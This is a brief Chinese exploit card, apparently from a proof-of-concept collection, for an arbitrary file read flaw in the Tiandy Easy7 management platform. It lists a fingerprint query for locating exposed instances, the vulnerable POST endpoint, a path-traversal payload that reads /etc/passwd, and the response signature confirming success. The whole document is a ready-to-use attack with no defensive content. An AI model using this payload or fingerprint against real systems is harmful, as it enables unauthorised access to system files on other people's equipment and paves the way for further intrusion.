# 天地伟业Easy7综合管理平台downloadWordRecord存在任意文件读取漏洞

天地伟业 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="Tiandy-Easy7"`
- **请求**：`POST /Easy7/rest/file/downloadWordRecord HTTP/1.1`

**Payload**
```
fileName=/../../../../../../../../../etc/passwd
```
- **响应特征**：200 root: